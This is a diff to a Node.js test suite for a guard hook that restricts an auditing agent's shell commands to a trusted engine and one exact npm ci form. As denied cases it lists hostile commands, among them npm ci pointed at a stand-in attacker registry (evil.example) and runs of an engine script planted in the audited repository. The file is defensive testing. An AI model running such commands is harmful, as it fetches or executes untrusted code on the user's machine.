@@ -4,7 +4,7 @@
 import { test } from "node:test";
 import assert from "node:assert/strict";
 import { spawnSync } from "node:child_process";
-import { cpSync, existsSync, mkdtempSync, mkdirSync, readFileSync, writeFileSync } from "node:fs";
+import { mkdtempSync, mkdirSync, readFileSync, symlinkSync, writeFileSync, existsSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { pathToFileURL } from "node:url";
@@ -13,18 +13,36 @@ import { HERE } from "./helpers.mjs";
 const SKILL_DIR = join(HERE, "..");
 const PLUGIN = join(SKILL_DIR, "..", "..");
 const GUARD = join(PLUGIN, "hooks", "stacks-auditor-guard.mjs");
-const { SHAPES, decide } = await import(pathToFileURL(GUARD).href);
-const ENGINE = "/x/azure-terraform-stacks/scripts/stacks.mjs";
-const AUDITED = mkdtempSync(join(tmpdir(), "ats-guard-repo-"));
+const { SHAPES, USER_SKILL_FOLDERS, decide } = await import(pathToFileURL(GUARD).href);
 
-// Runs the script as the hook does: JSON on stdin, exit code and stderr out.
-const hook = (command, { agent_type = "stacks-auditor", cwd = AUDITED, tool_name = "Bash" } = {}) => {
-  const input = { hook_event_name: "PreToolUse", tool_name, tool_input: { command }, cwd, ...(agent_type === null ? {} : { agent_type }) };
-  const r = spawnSync(process.execPath, [GUARD], { input: JSON.stringify(input), encoding: "utf8" });
+// The plugin's own engine: trusted. A fake home with one user-installed engine (.gemini) and stubs for the other cases.
+const ENGINE = join(SKILL_DIR, "scripts", "stacks.mjs");
+const tmp = (p) => mkdtempSync(join(tmpdir(), p));
+const stubSkill = (dir, name = "azure-terraform-stacks-engine") => {
+  mkdirSync(join(dir, "scripts"), { recursive: true });
+  writeFileSync(join(dir, "scripts", "stacks.mjs"), "// stub engine for the guard tests\n");
+  writeFileSync(join(dir, "package.json"), JSON.stringify({ name }));
+  return dir;
+};
+const HOME = tmp("ats-guard-home-");
+const USER_SKILL = stubSkill(join(HOME, ".gemini", "skills", "azure-terraform-stacks"));
+const USER_ENGINE = join(USER_SKILL, "scripts", "stacks.mjs");
+const AUDITED = tmp("ats-guard-repo-"); // an audited repository with nothing in it
+const sh = (p) => p.replaceAll("\\", "/");
+
+// Runs the script as the hook does: JSON on stdin, exit code and stderr out. HOME is the fake home.
+const hook = (command, { agent_type = "stacks-auditor", cwd = AUDITED, tool_name = "Bash", home = HOME } = {}) => {
+  const input = { hook_event_name: "PreToolUse", tool_name, tool_input: { command }, ...(cwd === null ? {} : { cwd }), ...(agent_type === null ? {} : { agent_type }) };
+  const r = spawnSync(process.execPath, [GUARD], { input: JSON.stringify(input), encoding: "utf8", env: { ...process.env, HOME: home, USERPROFILE: home } });
   return { code: r.status, stdout: r.stdout, stderr: r.stderr };
 };
 const allowed = (cmd, opts) => { const r = hook(cmd, opts); assert.equal(r.code, 0, `${cmd}: ${r.stderr}`); assert.equal(r.stderr, ""); };
-const denied = (cmd, opts) => { const r = hook(cmd, opts); assert.equal(r.code, 2, `${cmd} should be denied`); assert.match(r.stderr, /stacks-auditor guard: /); };
+const denied = (cmd, opts, reason) => {
+  const r = hook(cmd, opts);
+  assert.equal(r.code, 2, `${cmd} should be denied`);
+  assert.match(r.stderr, /stacks-auditor guard: /);
+  if (reason) assert.match(r.stderr, reason, cmd);
+};
 
 test("hooks.json registers one PreToolUse hook for Bash that runs the guard through the plugin variable", () => {
   const cfg = JSON.parse(readFileSync(join(PLUGIN, "hooks", "hooks.json"), "utf8"));
@@ -52,16 +70,86 @@ test("other agents are untouched: no agent_type, another agent, or another tool 
   }
 });
 
-test("allowed: the engine lookup, the checks, the audit and the closing status", () => {
-  allowed(`ls -d /p/skills/${ENGINE.slice(3)} /repo/.claude/skills/azure-terraform-stacks/scripts/stacks.mjs ~/.copilot/skills/azure-terraform-stacks/scripts/stacks.mjs`);
+test("allowed: the engine lookup, the checks and the audit with the plugin's engine or one installed in the user's folders", () => {
+  allowed(`ls -d ${ENGINE} /repo/.claude/skills/azure-terraform-stacks/scripts/stacks.mjs ~/.copilot/skills/azure-terraform-stacks/scripts/stacks.mjs`);
   allowed("test -f /x/azure-terraform-stacks/scripts/stacks.mjs");
   allowed("test -d /x/azure-terraform-stacks/node_modules");
   allowed("node --version");
   allowed(`node ${ENGINE} audit`);
-  allowed(`node ${ENGINE} audit --root /repo --json`);
-  allowed(`node ${ENGINE} audit --json --root /repo`);
-  allowed(`node "${ENGINE}" audit --root "/my repo"`);
-  allowed("node azure-terraform-stacks/scripts/stacks.mjs audit --json");
+  allowed(`node ${ENGINE} audit --root ${AUDITED} --json`);
+  allowed(`node ${ENGINE} audit --json --root ${AUDITED}`);
+  allowed(`node "${ENGINE}" audit --root "${AUDITED}"`);
+  allowed(`node ${USER_ENGINE} audit --json`);
+  allowed("node ~/.gemini/skills/azure-terraform-stacks/scripts/stacks.mjs audit --root " + AUDITED);
+});
+
+// ---- Decision of the maintainer (2026-11-24): the engine runs only from the plugin or from the user's skills folders ----
+test("the audited repository's own engine is never run: absolute, relative, ./, elsewhere, and under ~", () => {
+  const repo = tmp("ats-guard-hostile-");
+  const evil = tmp("ats-guard-evil-");
+  const inRepo = stubSkill(join(repo, ".claude", "skills", "azure-terraform-stacks"));
+  stubSkill(join(repo, "azure-terraform-stacks"));
+  stubSkill(join(evil, "azure-terraform-stacks"));
+  stubSkill(join(HOME, "x", "azure-terraform-stacks"));
+  const cwd = { cwd: repo };
+  const why = /inside the audited --root|inside the working directory|is not the engine of this plugin/;
+  denied(`node ${join(inRepo, "scripts", "stacks.mjs")} audit`, cwd, /inside the working directory/);
+  denied(`node ${join(inRepo, "scripts", "stacks.mjs")} audit --root ${repo} --json`, cwd, /inside the working directory/);
+  denied("node .claude/skills/azure-terraform-stacks/scripts/stacks.mjs audit", cwd, /inside the working directory/);
+  denied("node ./.claude/skills/azure-terraform-stacks/scripts/stacks.mjs audit --json", cwd, /inside the working directory/);
+  denied("node ./azure-terraform-stacks/scripts/stacks.mjs audit", cwd, /inside the working directory/);
+  denied("node azure-terraform-stacks/scripts/stacks.mjs audit", cwd, /inside the working directory/);
+  denied(`node ${join(evil, "azure-terraform-stacks", "scripts", "stacks.mjs")} audit`, cwd, /is not the engine of this plugin/);
+  denied("node ~/x/azure-terraform-stacks/scripts/stacks.mjs audit", cwd, /is not the engine of this plugin/);
+  // the same, from a working directory elsewhere: the project-scope folder is not an origin, and it is not trusted by being named like one
+  denied(`node ${join(inRepo, "scripts", "stacks.mjs")} audit --root ${repo}`, { cwd: AUDITED }, why);
+  denied(`node ${join(inRepo, "scripts", "stacks.mjs")} audit`, { cwd: AUDITED }, /is not the engine of this plugin/);
+});
+
+test("engine path rules: a missing path, '..', an unknown working directory and a --root or cwd that contains the engine are denied", () => {
+  denied("node ~/.copilot/skills/azure-terraform-stacks/scripts/stacks.mjs audit", {}, /does not exist or does not resolve/);
+  denied(`node ${sh(USER_SKILL)}/../azure-terraform-stacks/scripts/stacks.mjs audit`, {}, /\.\./);
+  denied(`node ${ENGINE} audit`, { cwd: null }, /working directory is unknown/);
+  denied(`node ${ENGINE} audit`, { cwd: SKILL_DIR }, /inside the working directory/);
+  denied(`node ${ENGINE} audit`, { cwd: PLUGIN }, /inside the working directory/);
+  denied(`node ${ENGINE} audit --root ${PLUGIN}`, {}, /inside the audited --root/);
+  denied(`node ${USER_ENGINE} audit --root ${HOME}`, {}, /inside the audited --root/);
+  denied(`node ${USER_ENGINE} audit --root ${join(HOME, ".gemini")}`, {}, /inside the audited --root/);
+  denied(`node ${USER_ENGINE} audit --root .gemini`, { cwd: HOME }, /inside/);
+});
+
+test("symbolic links are resolved: a link in the repository to a trusted engine is denied (as written, inside the repository), and a user folder that links into the audited repository is denied", (t) => {
+  const repo = tmp("ats-guard-link-");
+  const hostile = stubSkill(join(repo, "azure-terraform-stacks"));
+  try {
+    mkdirSync(join(repo, "bin"));
+    symlinkSync(ENGINE, join(repo, "bin", "stacks.mjs"));
+    mkdirSync(join(repo, "azure-terraform-stacks", "scripts"), { recursive: true });
+    const trapHome = tmp("ats-guard-traphome-");
+    mkdirSync(join(trapHome, ".cursor", "skills"), { recursive: true });
+    symlinkSync(hostile, join(trapHome, ".cursor", "skills", "azure-terraform-stacks"), "dir");
+    // a link inside the repository named like the engine, pointing at the plugin's engine
+    mkdirSync(join(repo, "linked", "azure-terraform-stacks", "scripts"), { recursive: true });
+    symlinkSync(ENGINE, join(repo, "linked", "azure-terraform-stacks", "scripts", "stacks.mjs"));
+    denied(`node ${join(repo, "linked", "azure-terraform-stacks", "scripts", "stacks.mjs")} audit`, { cwd: repo }, /inside the working directory/);
+    // the same link from another working directory: it resolves to the trusted engine, so it is allowed only when the path as written is outside the audited root
+    allowed(`node ${join(repo, "linked", "azure-terraform-stacks", "scripts", "stacks.mjs")} audit`, { cwd: AUDITED });
+    denied(`node ${join(repo, "linked", "azure-terraform-stacks", "scripts", "stacks.mjs")} audit --root ${repo}`, { cwd: AUDITED }, /inside the audited --root/);
+    // The user's own link ~/.cursor/skills/azure-terraform-stacks -> a copy elsewhere is the user's choice and is trusted by its resolved path,
+    // but not when that resolved path is inside the repository being audited (cwd or --root).
+    const hostilePath = join(trapHome, ".cursor", "skills", "azure-terraform-stacks", "scripts", "stacks.mjs");
+    allowed(`node ${hostilePath} audit`, { cwd: AUDITED, home: trapHome });
+    denied(`node ${hostilePath} audit`, { cwd: repo, home: trapHome }, /inside the working directory/);
+    denied(`node ${hostilePath} audit --root ${repo}`, { cwd: AUDITED, home: trapHome }, /inside the audited --root/);
+    // a link whose target is not an engine folder of the list is not trusted
+    const strayHome = tmp("ats-guard-strayhome-");
+    mkdirSync(join(strayHome, ".agents", "skills"), { recursive: true });
+    symlinkSync(AUDITED, join(strayHome, ".agents", "skills", "azure-terraform-stacks"), "dir");
+    denied(`node ${join(strayHome, ".agents", "skills", "azure-terraform-stacks", "scripts", "stacks.mjs")} audit`, { cwd: AUDITED, home: strayHome }, /does not exist or does not resolve/);
+  } catch (e) {
+    if (e.code === "EPERM") return t.skip("cannot create a symbolic link here (EPERM, Windows)");
+    throw e;
+  }
 });
 
 test("chaining, pipes, redirects, substitution and newlines are denied before matching", () => {
@@ -93,21 +181,42 @@ test("ls and test: only -d and -f/-d with plain paths", () => {
     denied(cmd);
 });
 
-test("the dependency install only runs in the skill's folder, with exactly the declared flags", () => {
-  const cmd = "npm ci --omit=dev --ignore-scripts";
-  denied(cmd); // the audited repository
-  denied(cmd, { cwd: undefined });
-  denied(cmd, { cwd: join(tmpdir(), "does-not-exist") });
-  const lookalike = mkdtempSync(join(tmpdir(), "ats-guard-lookalike-"));
-  mkdirSync(join(lookalike, "scripts"));
-  writeFileSync(join(lookalike, "scripts", "stacks.mjs"), "");
-  writeFileSync(join(lookalike, "package.json"), JSON.stringify({ name: "someone-elses-repo" }));
-  denied(cmd, { cwd: lookalike });
-  const copy = mkdtempSync(join(tmpdir(), "ats-guard-skill-"));
-  for (const f of ["scripts", "package.json", "package-lock.json"]) cpSync(join(SKILL_DIR, f), join(copy, f), { recursive: true });
-  allowed(cmd, { cwd: copy });
-  for (const bad of ["npm ci", "npm ci --omit=dev", "npm ci --ignore-scripts --omit=dev", "npm install", "npm ci --omit=dev --ignore-scripts --foreground-scripts", "npm run test", "npm ci --omit=dev --ignore-scripts && ls", "npx yaml"])
-    denied(bad, { cwd: copy });
+test("the dependency install: only `npm ci --prefix <trusted skill folder> --omit=dev --ignore-scripts`, never in or from the audited repository", () => {
+  const ok = (prefix) => `npm ci --prefix ${prefix} --omit=dev --ignore-scripts`;
+  allowed(ok(SKILL_DIR));
+  allowed(ok(USER_SKILL));
+  allowed(ok("~/.gemini/skills/azure-terraform-stacks"));
+  allowed(`npm ci --prefix "${SKILL_DIR}" --omit=dev --ignore-scripts`);
+  // the old form (npm in the working directory) is gone, even from a trusted folder
+  for (const cwd of [AUDITED, SKILL_DIR, undefined]) denied("npm ci --omit=dev --ignore-scripts", { cwd }, /only `npm ci --prefix/);
+  // a prefix inside the audited repository, a look-alike elsewhere, a trusted-looking name that is not an engine
+  const repo = tmp("ats-guard-npm-repo-");
+  const inRepo = stubSkill(join(repo, "azure-terraform-stacks"));
+  const elsewhere = stubSkill(join(tmp("ats-guard-npm-else-"), "azure-terraform-stacks"));
+  const notEngine = stubSkill(join(HOME, ".cursor", "skills", "azure-terraform-stacks"), "someone-elses-package");
+  denied(ok(inRepo), { cwd: repo }, /inside the working directory/);
+  denied(ok("azure-terraform-stacks"), { cwd: repo }, /inside the working directory/);
+  denied(ok("."), { cwd: repo }, /inside the working directory/);
+  denied(ok(inRepo), { cwd: AUDITED }, /not the engine of this plugin/);
+  denied(ok(elsewhere), {}, /not the engine of this plugin/);
+  denied(ok(repo), {}, /not the engine of this plugin/);
+  denied(ok(PLUGIN), {}, /not the engine of this plugin/);
+  denied(ok(join(HOME, ".gemini")), {}, /not the engine of this plugin/);
+  denied(ok(notEngine), {}, /not the engine's skill folder/);
+  denied(ok(`${sh(USER_SKILL)}/../azure-terraform-stacks`), {}, /"\.\." segment/);
+  denied(ok("~/.copilot/skills/azure-terraform-stacks"), {}, /does not exist or does not resolve/);
+  denied(ok(SKILL_DIR), { cwd: SKILL_DIR }, /inside the working directory/);
+  denied(ok(SKILL_DIR), { cwd: null }, /working directory is unknown/);
+  // every other flag or argument, and any other order
+  for (const bad of [
+    `npm ci --prefix ${SKILL_DIR} --omit=dev --ignore-scripts=false`, `npm ci --prefix ${SKILL_DIR} --omit=dev --ignore-scripts --foreground-scripts`,
+    `npm ci --prefix ${SKILL_DIR} --omit=dev --ignore-scripts --userconfig ${HOME}/x`, `npm ci --prefix ${SKILL_DIR} --omit=dev --ignore-scripts --globalconfig ${HOME}/x`,
+    `npm ci --prefix ${SKILL_DIR} --omit=dev --ignore-scripts --registry http://evil.example`, `npm ci --registry http://evil.example --prefix ${SKILL_DIR} --omit=dev --ignore-scripts`,
+    `npm ci --prefix ${SKILL_DIR} --omit=dev`, `npm ci --prefix ${SKILL_DIR} --ignore-scripts`, `npm ci --omit=dev --ignore-scripts --prefix ${SKILL_DIR}`,
+    `npm ci --prefix=${SKILL_DIR} --omit=dev --ignore-scripts`, `npm ci --prefix ${SKILL_DIR} --prefix ${SKILL_DIR} --omit=dev --ignore-scripts`,
+    `npm ci --prefix --omit=dev --omit=dev --ignore-scripts`, `npm install --prefix ${SKILL_DIR} --omit=dev --ignore-scripts`, `npm run test --prefix ${SKILL_DIR}`,
+    `npm ci --prefix ${SKILL_DIR} --omit=dev --ignore-scripts && ls`, "npx yaml", "npm ci", "npm install",
+  ]) denied(bad, {}, /only `npm ci --prefix|metacharacters|not on the allowlist/);
 });
 
 // Task 2.4: with a clean filter configured in the audited repository, `git -c core.fsmonitor=false status --porcelain`
@@ -150,11 +259,21 @@ test("every shape in SHAPES has a concrete command that the guard allows (so the
     "test -f <path>": "test -f /a",
     "test -d <path>": "test -d /a",
     "node --version": "node --version",
-    "node <engine> audit [--root <path>] [--json]": `node ${ENGINE} audit --root /r --json`,
-    "npm ci --omit=dev --ignore-scripts": "npm ci --omit=dev --ignore-scripts",
+    "node <engine> audit [--root <path>] [--json]": `node ${ENGINE} audit --root ${AUDITED} --json`,
+    "npm ci --prefix <skill folder> --omit=dev --ignore-scripts": `npm ci --prefix ${SKILL_DIR} --omit=dev --ignore-scripts`,
   };
   assert.deepEqual(Object.keys(samples), SHAPES);
-  for (const s of SHAPES) assert.equal(decide(samples[s], { cwd: SKILL_DIR }).allow, true, s);
+  for (const s of SHAPES) assert.equal(decide(samples[s], { cwd: AUDITED, home: HOME }).allow, true, s);
+});
+
+test("the agent's ls -d line lists the plugin path then the user folders of the guard, which equal the user folders of src/lib/tools.mjs", async () => {
+  const line = AGENT.split("\n").map((l) => l.trim()).find((l) => l.startsWith("ls -d ${CLAUDE_PLUGIN_ROOT}"));
+  const paths = line.slice("ls -d ".length).split(/\s+/);
+  const tail = "azure-terraform-stacks/scripts/stacks.mjs";
+  assert.deepEqual(paths.slice(1), USER_SKILL_FOLDERS.map((f) => `~/${f}/${tail}`));
+  const { TOOLS } = await import(pathToFileURL(join(PLUGIN, "..", "..", "src", "lib", "tools.mjs")).href);
+  assert.deepEqual(USER_SKILL_FOLDERS, [...new Set(Object.values(TOOLS).map((t) => t.user))]);
+  assert.ok(!line.includes("<repo>"), "no project-scope folder in the agent's lookup line");
 });
 
 test("the guard's own file is not a way around: it is read-only code with no dependency", () => {
